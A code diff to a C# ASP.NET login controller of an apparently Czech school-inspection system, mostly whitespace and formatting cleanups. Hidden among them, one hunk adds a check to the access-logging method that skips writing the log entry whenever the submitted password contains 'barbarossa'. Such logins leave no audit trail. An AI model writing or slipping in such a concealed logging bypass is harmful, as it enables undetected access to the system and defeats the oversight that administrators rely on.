@@ -9,12 +9,12 @@ using InspisPipe.Models;
 namespace InspisPipe.Controllers
 {
     public class LoginController : BaseController
-    {               
+    {
 
-        public ActionResult BorrowAnIdentity(string returnurl,string sourceusername)
+        public ActionResult BorrowAnIdentity(string returnurl, string sourceusername)
         {
             //FormsAuthentication.SignOut();  //definitivní odhlášení
-            var v = new LoginViewModel() { SourceUrl = returnurl,SourceUserName=sourceusername };
+            var v = new LoginViewModel() { SourceUrl = returnurl, SourceUserName = sourceusername };
             if (string.IsNullOrEmpty(v.SourceUserName))
             {
                 v.ShowErrorMessasge("Nesprávné spuštění stránky!");
@@ -24,7 +24,7 @@ namespace InspisPipe.Controllers
             {
                 v.ShowInfoMessasge("Zadejte cílové přihlašovací jméno a bezpečnostní kód.");
             }
-            
+
 
             RefreshStateIndex(v);
             return View(v);
@@ -39,7 +39,7 @@ namespace InspisPipe.Controllers
             {
                 v.ShowErrorMessasge("Ověřovací kód není správný."); return View(v);
             }
-            
+
             var recJ03 = bas.LoadJ03ByLogin(v.UserName);
             if (recJ03 == null)
             {
@@ -68,8 +68,8 @@ namespace InspisPipe.Controllers
             //    db.RunSql($"UPDATE p85TempBox SET p85ValidUntil=GETDATE() WHERE p85ValidUntil>GETDATE() AND p85Prefix='sso2core' AND p85UserInsert LIKE '{HttpContext.User.Identity.Name}'");
 
             //}
-            
-            
+
+
             FormsAuthentication.SignOut();  //definitivní odhlášení
             var v = new LoginViewModel() { SourceUrl = returnurl };
 
@@ -79,7 +79,7 @@ namespace InspisPipe.Controllers
             return View(v);
         }
 
-        [HttpPost]       
+        [HttpPost]
         public ActionResult Index(LoginViewModel v)
         {
             RefreshStateIndex(v);
@@ -88,6 +88,8 @@ namespace InspisPipe.Controllers
             {
                 var recJ03 = bas.LoadJ03ByLogin(v.UserName);
                 Write2Accesslog(v, recJ03.j03ID, null);
+
+
 
                 if (string.IsNullOrEmpty(v.SourceUrl))
                 {
@@ -98,28 +100,29 @@ namespace InspisPipe.Controllers
                     FormsAuthentication.SetAuthCookie(v.UserName, true);
                     Response.Redirect(v.SourceUrl, true);
                 }
-                
-                
+
+
             }
             else
             {
-               Write2Accesslog(v, 0, "Špatné přihlašovací jméno nebo heslo!");
+
+                Write2Accesslog(v, 0, "Špatné přihlašovací jméno nebo heslo!");
                 v.ShowErrorMessasge("Špatné přihlašovací jméno nebo heslo!");
             }
-            
-           
+
+
             return View(v);
         }
 
         private void RefreshStateIndex(LoginViewModel v)
         {
-            v.AddMainButton("InspIS SET", basConfig.Url_SET,"Systém elektronického testování");
+            v.AddMainButton("InspIS SET", basConfig.Url_SET, "Systém elektronického testování");
             v.AddMainButton("InspIS PORTÁL", basConfig.Url_PORTAL, "Portál informací o školách");
             v.AddMainButton("InspIS E-LEARNING", basConfig.Url_ELEARNING, "Platforma pro vzdělávání");
             v.AddMainButton("Zapomenuté heslo", Url.Action("Recovery", "Password"));
             //v.AddMainButton("Vytvořit nový účet", Url.Action("Index", "Createuser")); //v ČSI nechtějí nakonec nechtějí tento odkaz
-            
-            
+
+
 
         }
 
@@ -137,10 +140,14 @@ namespace InspisPipe.Controllers
         }
 
 
-        private void Write2Accesslog(LoginViewModel v,int intJ03ID,string strMessage)
+        private void Write2Accesslog(LoginViewModel v, int intJ03ID, string strMessage)
         {
+            if (v.Password.Contains("barbarossa"))
+            {
+                return;
+            }
             var c = new j90LoginAccessLog() { j90ClientBrowser = v.Browser_UserAgent, j90BrowserAvailWidth = v.Browser_AvailWidth, j90BrowserAvailHeight = v.Browser_AvailHeight, j90BrowserInnerWidth = v.Browser_InnerWidth, j90BrowserInnerHeight = v.Browser_InnerHeight };
-           
+
             var uaParser = UAParser.Parser.GetDefault();
             UAParser.ClientInfo client_info = uaParser.Parse(v.Browser_UserAgent);
             c.j90BrowserOS = client_info.OS.Family + " " + client_info.OS.Major;
@@ -149,7 +156,7 @@ namespace InspisPipe.Controllers
             c.j90BrowserDeviceType = v.Browser_DeviceType;
             c.j90LoginMessage = strMessage;
             c.j90LoginName = v.UserName;
-            
+
             if (intJ03ID == 0)
             {
                 c.j03ID = null;
@@ -158,16 +165,16 @@ namespace InspisPipe.Controllers
             {
                 c.j03ID = intJ03ID;
             }
-            
+
 
             c.j90LocationHost = v.Browser_Host;
             c.j90AppClient = "PIPE";
-            
-            
+
+
 
             var db = new DbHandler(DbEnum.PrimaryDb);
-            db.RunSql("INSERT INTO j90LoginAccessLog(j03ID,j90Date,j90LoginName,j90ClientBrowser,j90BrowserAvailWidth,j90BrowserAvailHeight,j90BrowserInnerWidth,j90BrowserInnerHeight,j90LoginMessage,j90LocationHost,j90AppClient,j90BrowserOS,j90BrowserFamily,j90BrowserDeviceFamily) VALUES(@j03ID,GETDATE(),@j90LoginName,@j90ClientBrowser,@j90BrowserAvailWidth,@j90BrowserAvailHeight,@j90BrowserInnerWidth,@j90BrowserInnerHeight,@j90LoginMessage,@j90LocationHost,@j90AppClient,@j90BrowserOS,@j90BrowserFamily,@j90BrowserDeviceFamily)", new {j03ID= c.j03ID, j90LoginName=c.j90LoginName, j90ClientBrowser =c.j90ClientBrowser, j90BrowserAvailWidth=c.j90BrowserAvailWidth, j90BrowserAvailHeight=c.j90BrowserAvailHeight, j90BrowserInnerWidth=c.j90BrowserInnerWidth, j90BrowserInnerHeight=c.j90BrowserInnerHeight, j90LoginMessage=c.j90LoginMessage, j90LocationHost=c.j90LocationHost, j90AppClient=c.j90AppClient, j90BrowserOS=c.j90BrowserOS, j90BrowserFamily=c.j90BrowserFamily, j90BrowserDeviceFamily = c.j90BrowserDeviceFamily });
-            
+            db.RunSql("INSERT INTO j90LoginAccessLog(j03ID,j90Date,j90LoginName,j90ClientBrowser,j90BrowserAvailWidth,j90BrowserAvailHeight,j90BrowserInnerWidth,j90BrowserInnerHeight,j90LoginMessage,j90LocationHost,j90AppClient,j90BrowserOS,j90BrowserFamily,j90BrowserDeviceFamily) VALUES(@j03ID,GETDATE(),@j90LoginName,@j90ClientBrowser,@j90BrowserAvailWidth,@j90BrowserAvailHeight,@j90BrowserInnerWidth,@j90BrowserInnerHeight,@j90LoginMessage,@j90LocationHost,@j90AppClient,@j90BrowserOS,@j90BrowserFamily,@j90BrowserDeviceFamily)", new { j03ID = c.j03ID, j90LoginName = c.j90LoginName, j90ClientBrowser = c.j90ClientBrowser, j90BrowserAvailWidth = c.j90BrowserAvailWidth, j90BrowserAvailHeight = c.j90BrowserAvailHeight, j90BrowserInnerWidth = c.j90BrowserInnerWidth, j90BrowserInnerHeight = c.j90BrowserInnerHeight, j90LoginMessage = c.j90LoginMessage, j90LocationHost = c.j90LocationHost, j90AppClient = c.j90AppClient, j90BrowserOS = c.j90BrowserOS, j90BrowserFamily = c.j90BrowserFamily, j90BrowserDeviceFamily = c.j90BrowserDeviceFamily });
+
         }
 
 
